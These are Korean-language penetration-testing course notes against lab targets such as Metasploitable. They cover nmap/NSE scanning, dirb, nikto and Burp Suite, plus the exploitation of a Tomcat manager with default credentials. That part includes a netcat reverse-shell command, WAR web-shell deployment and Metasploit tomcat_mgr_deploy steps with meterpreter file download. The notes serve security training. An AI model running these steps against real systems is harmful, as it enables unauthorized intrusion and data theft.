## Metasploitable

* Metasploit Framework (취약점 통합 도구)

  * 진단하기 위해 만들어진 환경 Metasploitable V2
  * Rapid 7 회사가 운영/개발
* sudo nmap -sV 192.168.81.131 -p- -oX result.xml

  * -sV: 버전 표시
  * -p-: 모든 포트 표시
  * -oX: 명령어를 이용하여 result.xml에 결과 저장
    * 후에 다른 포맷으로 변환하기 좋음
* 192.168.81.0/24 -> 1부터 25까지 IP를 NMAP 돌림
* sudo xsltproc result.xml -o result.html
  * html을 열어서 엑셀로 복사하기 좋음
  * 고객사에겐 엑셀로 전달하자!
* sudo searchsploit --nmap result.xml
  * result.xml을 불러와서 searchsploit을 한번에 불러옴

## Nmap NSE
  * nmap 스크립트 엔진
  * 사이트를 참고해서 nmap 취약점 분석을 할 수 있음
    * https://nmap.org/\
  * Lua 확장기능이 있음
    * 파이썬 같은 스크립트 언어, 게임에서 많이 쓰임
    * 취약점에 대해서 스크립트로 진단이 가능
    * 예시 스크립트
      * https://nmap.org/nsedoc/scripts/http-ls.html
        * index of 취약점 관련 스크립트
  * sudo nmap -sV -sC 192.168.75.131 
    * -sC: Script Default (스크립트 활성화)
  * cd /usr/share/nmap/scripts
    * nmap 스크립트 저장 위치
    * /usr/share
      * 프로그램 설치 시 관련된 파일은 여깄음
  * 스크립트 관련 옵션
    * --script=vuln
      * 카테고리에 해당하는 스크립트 모두 실행
    * --script=whois-domian
      * 1 개의 스크립트를 실행

### ftp 취약점 예시
* _ftp-anon: Anonymous FTP login allowed
  * ftp 192.168.75.131
  * Name: anonymous 입력
  * 로그인이 됨.. 
* 111/tcp  open  rpcbind 
  * remote process call
  * 열린 포트를 보면
    * nfs: 원격 파일 서버가 열려 있음
* 버전 정보 노출

## sudo nmap -sV --script=vuln 192.168.81.128
* 카테고리로 nmap 하는 것과 달리 안보이던게 보임
* backdoor 취약점
    * exploit result:
    * root 권한으로 공격 가능
    * 뭔진 모르겠지만 심각하다
* CVE
  * 취약점의 ID값
* 80 http
  * SQL Injection 등이 나옴
* 8180 포트
  * admin 관련 취약점이 나옴
* -p21 옵션
  * sudo nmap -sV --script=vuln 192.168.75.1/24 -p21
  * 21번 포트만을 대상으로 nmap을 할 수 있음
  * beebox -> 버전 취약점들이 나오 
  * meta -> 관련 취약점도 나옴

### 모의해킹 과정 (포트 점검)
* 내부 점검
  * nmap으로 직접 점검
* 외부 점검
  * OSINT 사용
* 버전 정보, 일부 취약점 정보 수집
  * NSE 사용

## 웹 취약점 분석

* 웹 취약점 분석
  * 버전정보
  * 디렉토리 / 파일 구조 정보
  * 불필요한 파일 여부 확인
  * 설정 미흡으로 인한 디렉토리 리스팅 (index of)
  * 관리자 페이지 접근 제어 미흡
  * (심화) 각 취약점별 패턴 대입 여부 확인!

### Dirb (디렉토리 공격)
* dirb
  * directory buster
    * 디렉토리 무작위 공격
    * 모든 디렉토리를 크롤링해서 결과값 만듦
      * admin, password 등 문자열을 대입해서 공격
        * WORDLIST 파일에 있는 단어로
  * http 상태 코드로 성공 여부 판단
    * 200 OK가 나오면 wordlist에 있는 디렉토리 혹은 파일이 존재하는 것
      * 201 -> 요청한 것 작성 완료 (created)

### http 상태 코드
* 301, 302
  * 강제 이동
  * 예: 로그인 페이지로 강제 이동
* 200, 201
  * 200 ok
  * 201 -> 요청한 것 작성완료
* 404
  * NOT Found
  * 페이지 없음
* 403
  * 해당 디렉토리가 있지만 거부당한 것
* 500번대
  * 서버 오류
  * 502 Bad Gateway

### WORDLIST
* locate wordlist
  * 여러 wordlist를 찾을 수 있고 이것들을 사용 가능
* 사전 파일 공격 이라고 함
  * 무작위 대입 공격은 무작위로 순서대로 대입공격하는 것
    * a~z, aaaaaa~zzzzzz

### 디렉토리 검사 결과

* phpinfo 페이지 노출
* phpmyadmin
  * php 서버의 admin 페이지
  * phpmyadmin의 하위 디렉토리를 삭제해야 겠음
* 302번대
  * 리다이렉션
  
## 웹 취약점 분석 도구 (nikto)
* sudo nikto -h http://192.168.75.131/
* pearl 기반의 취약점 분석 도구
* 디렉토리 검사와 해석도 해줌
  * nmap nse는 이보단 좀 미흡함
* 검사결과
  * doc
    * index of 취약점
  * phpMyAdmin
    * 인증처리 미흡
  * test
    * index of
  * phpAdmin


## 웹 취약점 도구
* 무료
  * nikto
  * dirb
  * owasp zap (GUI)
  * arachni (유료료 변경)
* 유료
  * Accunetix
  * Appscan
  * Burpsuite pro
  
## WAS 접근 제어 취약점 - Tomcat
* 정적 서버 (WEB)
  * Apache
* 동적 서버 (WAS)
  * Tomcat
    * jsp, java 처리
* DB 서버

## 톰캣 관리자 페이지 (http://192.168.75.131:8180/manager/html)
* 로그인 방법
  * nikto http://192.168.75.131:8180
    * 취약점을 찾을 수 있음
    * 아이디 tomcat 비번 tomcat
* 톰캣 웹 어플리케이션 매니저
  * Applications
    * 페이지 끄고 킬 수 있음
  * Deploy
    * 개발한 JSP 파일을 압축으로 묶어서 War 파일 업로드
* 서비스를 중단시킬 수 있음
* war 파일 안에 악성 스크립트를 넣어서 올림 수 있음
  * 악성 스크립트 설치 효과 -> 백도어로 사용할 수 있다

### Web Shell
* 웹을 통해서 쉘을 다룰 수 있는 것
  * 좀 불편함.. 
  * 시스템에 백도어로 접속을 해서 권한을 가져와야 함
    * 리버스 컨넥션 (Reverse Connection)
* test.war
  * 악성 스크립트
  * shell.jsp

### 쉘 명령어
* ps -ef
  * 실행된 프로세스
* netstat -na
  * 네트워크 정보 확인
  * Established
    * 송신자와 수신지가 연결되어 있다
  * netstat -na -o
* uname -na
* id
  * 웹 쉘의 실행 권한
  * 여기서는 APACHE 실행 권한
    * tomcat임
* cd ..
  * cd .. && ls -al 해야 함

## 리버스 컨넥션 (Reverse Connection)
* 침투한 서버가 역으로 공격자에게 권한을 주는 것
  * 공격자 (포트 열람)
  * 침투한 서버 (웹쉘)
* nc -lvp 4444
  * netcat: 소캣통신 도구
  * 4444 포트를 listening 함
* nc 192.168.75.128 4444 -e /bin/sh
  * -e옵션 -> 파일을 전송한다는 것
  * /bin/sh -> 쉘 권한
* 거의 모든 악성코드는 reverse connection 방식으로 함

## 메타스플로잇 공격?
* sudo msfdb init
  * 메타스플로잇 프레임워크 초기화
* sudo msfconsole
  * payloads
    * 접점? 
  * encoders
    * 난독화
  * search tomcat
    * 27  auxiliary/scanner/http/tomcat_mgr_login                                          normal     No     Tomcat Application Manager Login Utility
    * use 27
      * show options
        * required -> 채워야 하는 옵션
        * set RHOSTS 192.168.75.131
          * RHOSTS: 아이피를 체크하는 모듈?
        * set RPORT 8180
        * set STOP_ON_SUCCESS true
          * 설정 안하면 안멈춤 (뭐가?)
        * exploit
          * 설정된 문자열로 공격!
    * tomcat_mgr_deploy
      * use 6
      * show options
        * Module options
        * Payload options
      * set HttpPassword tomcat
      * set HttpUsername tomcat
      * set RHOSTS 192.168.75.131
      * set RPORT 8180
      * exploit
        * war 파일 생성
          * L1aO6bYp0JKCmCPZUWTaqGhe6unobC.war
        * meterpreter > 에서 입력할 명령어
          * getuid
          * sysinfo
          * exit
          * shell
  * 악성코드를 심은 PC에 파일을 가져오고 싶으면?
    * nc 사용!
    * 메타프리터에서 제공하는 것을 사용하면 좋음
      * search -f *.txt
      * download /var/www/twiki/readme.txt
      * upload /var/www/twiki/readme.txt

## 인증 처리 미흡 취약점
* A07:2021-Identification and Authentication Failures
  * 이거에 해당하는 취약점 (OWASP)
* mysql -u root -p
* create database gmshop;
* show databases;
* exit
* /var/www/gm/lib/db_info.php
  * 커넥션 정보
  * gmshop?
* solution.sql
  * 쿼리를 백업해둔것
* mysql -uroot -pbug gmshop < solution.sql
  * gmshop 테이블에 solution.sql 넣기

### 배경지식

* 클라이언트 스크립트(HTML, Javascript)
* 서버사이드 스크립트(PHP, JSP/JAVA)
* 데이버테이스 (Mysql, Mssql, Oracle)
* 셋 다 어느정도 이해 해야 함!

## 시나리오
1. 다른 사용자 게시물 수정 및 삭제 여부   
   인증이 잘못된 것
2. 다른 사용자 개인정보 수정 페이지 접근 가능 여부   
   다른 사람의 수강신청 사이트 가는 것
3. 상품 결제 금액 조작 여부 
4. 비밀글 접근
5. 공인인증서 우회를 통한 권한 획득 여부
6. 다른 사용자의 온라인 증명서 발급 여부

## BurpSuite

* 설치
  * https://portswigger.net/burp/communitydownload

### 프록시 서버
* 두가지 종류가 있음
  1. 네트워크 프록시 서버   
    * 캐시 저장 목적
      * 사용자 <--> 네트워크 프록시 서버 <--> 외부
    * 보안 목적
      * 웹 차단 솔루션, 악성코드 패킷 분석
        * 금융권 -> 인터넷으로 영화볼 수 없음
  2. 클라이언트 웹브라우저 ----> 프록시 서버 (Proxy Server) ----> 서버 (웹서비스)
    * 프록시 서버가 중간에 Intercept 가능
      * 패킷을 조작할 수도 있음
        * Request: 요청 패킷
        * Response: 돌아오는 패킷
    
### 클라이언트 프록시
* 브라우저에서 깔 수 있음
  * foxy proxy 플러그인 설정
    * Hostname: 127.0.0.1
    * Port: 8080
    * 웹 프록시 ON
      * Burp Suite 종료 후 OFF 안하면 인터넷 안됨

### GET 메소드, POST 메소드
* GET
  * 데이터 받기
* POST
  * 데이터 전송
* 헤더 정보
  * User-Agent: 브라우저 정보
      * 모바일접속? PC 접속?
  * Content-Length: 내용 길이
  * Accept: 
  * Referer: 페이지 접근하기 전에 어디 페이지에서 왔나?
    * 홍보페이지를 만듦
      * 페이스북에서 왔는지 트위터에서 왔는지
    * 악성코드
      * 관리자페이지에서 왔나, 일반 페이지에서 왔나
  * Cookie
    * 로그인 상태
    * 세션 값 저장
    * 브라우저에 저장된 쿠키값이 서버의 쿠기값과 일치
      * 로그인 상태 유지
    * 쿠키는 일종의 인증 값
      * 쿠키 값을 탈취되면 안 됨 !!
    * 쿠키값은 브라우저에 저장됨
      * PC의 파일에 저장 되어 있다고도 함
